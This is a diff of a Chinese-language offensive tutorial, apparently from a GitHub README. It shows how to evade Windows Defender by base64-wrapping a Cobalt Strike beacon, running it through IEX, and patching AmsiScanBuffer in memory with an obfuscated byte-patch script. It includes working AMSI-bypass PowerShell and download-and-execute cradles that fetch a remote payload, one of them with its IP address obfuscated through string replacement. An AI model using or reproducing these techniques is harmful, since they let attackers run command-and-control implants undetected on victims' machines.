@@ -12,33 +12,31 @@
 
 # 0x01.通过修补 AMSI.dll 的操作码绕过ASMI
 
-# 1.用cobaltstrike生成一个beacon.ps1,当然你用generator也可以
+### 1.用cobaltstrike生成一个beacon.ps1,当然你用generator也可以
 ![image](https://user-images.githubusercontent.com/89376703/155735798-0388189e-ec01-47d4-976c-799891746687.png)
 
 ![image](https://user-images.githubusercontent.com/89376703/155735869-45a3c954-8737-4ac4-a4ad-3b750f335b82.png)
 
 
 
-# 注意我这里用的是64位的stageless，powershell文件越大，混淆的手法越
+### 注意我这里用的是64位的stageless，powershell文件越大，混淆的手法越
 
 
 ![image](https://user-images.githubusercontent.com/89376703/155733969-384abfb3-64be-4c93-b2b8-c7c60ea8dd13.png)
 
 
-# 使用C#加密器对整个ps1文件进行base64加密
+### 使用C#加密器对整个ps1文件进行base64加密
 ![image](https://user-images.githubusercontent.com/89376703/155734073-c1d9b0d1-0da9-40b2-ad38-bdc10a5563fb.png)
 
 
 
-
-# 重新创建一个文件命名为pay.ps1,将上面的base64密文复制粘贴到下面代码的$decryption字符串变量中
+### 重新创建一个文件命名为pay.ps1,将上面的base64密文复制粘贴到下面代码的$decryption字符串变量中
 
 
 ![image](https://user-images.githubusercontent.com/89376703/155734157-19d0ed09-04fd-4ce2-90d4-6b27b0ef65cc.png)
 
 
-
-# 这里就是一个常用的base64的解密公式，然后用IEX去执行解密后的密文
+### 这里就是一个常用的base64的解密公式，然后用IEX去执行解密后的密文
 
 ``` 
 解密后的变量 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(加密后的变量)); 
@@ -46,7 +44,7 @@
 
 
 
-# 但是amsi.dll对IEX是有严格限制的，直接执行解密密文必然会被拦截，因此这里我们需要一段破坏或者劫持amsi.dll的ps代码
+### 但是amsi.dll对IEX是有严格限制的，直接执行解密密文必然会被拦截，因此这里我们需要一段破坏或者劫持amsi.dll的ps代码
 
 ```
 $Win32 = @"
@@ -70,7 +68,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 
-# 当然如果你怕代码被云标记的话可以加一些混淆，比如说字符串的分裂，或者转换成ASCLL字符码
+### 当然如果你怕代码被云标记的话可以加一些混淆，比如说字符串的分裂，或者转换成ASCLL字符码
 
 ```
 #导入API 函数
@@ -101,16 +99,14 @@ $macm = "0xC3"
 $hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)
 [System.Runtime.InteropServices.Marshal]::Copy($hquzq, 0, $bhijoj, 6)
 ```
-
-# 将混淆过后的代码插入解密代码中
+### 将混淆过后的代码插入解密代码中
 
 ![image](https://user-images.githubusercontent.com/89376703/155734244-a2185115-0d62-4b8c-96f0-7e09b6caf530.png)
-
-# 放在windows defender环境下无文件执行即可
+### 放在windows defender环境下无文件执行即可
 
 ![image](https://user-images.githubusercontent.com/89376703/155734381-81a55fb3-78f8-4303-b78a-0e88702ff2fb.png)
 
-# 可以看到可以绕过微软，能执行一些基本的命令，但是dumplass应该不行。
+### 可以看到可以绕过微软，能执行一些基本的命令，但是dumplass应该不行。
 
 ## **绕过原理**
 
@@ -129,7 +125,7 @@ HRESULT AmsiScanBuffer(
 );
 ```
 
-## 其中一个参数“长度”本质上是绕过的关键。此参数包含要扫描的字符串的长度。如果通过某种方式将参数设置为常数值 0，则 AMSI 将被有效地绕过，因为 AmsiScanBuffer 函数将假定任何后续要扫描的字符串的长度都为 0。这是通过在运行时修补 AMSI.dll 的操作码来实现的。
+### 其中一个参数“长度”本质上是绕过的关键。此参数包含要扫描的字符串的长度。如果通过某种方式将参数设置为常数值 0，则 AMSI 将被有效地绕过，因为 AmsiScanBuffer 函数将假定任何后续要扫描的字符串的长度都为 0。这是通过在运行时修补 AMSI.dll 的操作码来实现的。
 
 ## 使用GetProcAddress()函数获取 AmsiScanBuffer() 的句柄，找到amsi.dll带修补的地址
 
@@ -174,7 +170,7 @@ IEX($content)
 IEX ((new-object net.webclient).downloadstring('http://0.0.0.0:8000/bypass.txt'.))
 ```
 
-同样的我们可以通过Replace函数去替换字符串来混淆IP地址（远程的powershell样本必须免杀）
+同样的我们可以通过Replace函数去替换字符串来混淆IP地址（远程托管的powershell样本必须免杀）
 
 ```
 IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()2.202.188@@@@@:8000/byp**************ass.tx**************t".Replace('@@@@@','').Replace('@!#$%^&*()','').Replace('**************',''))
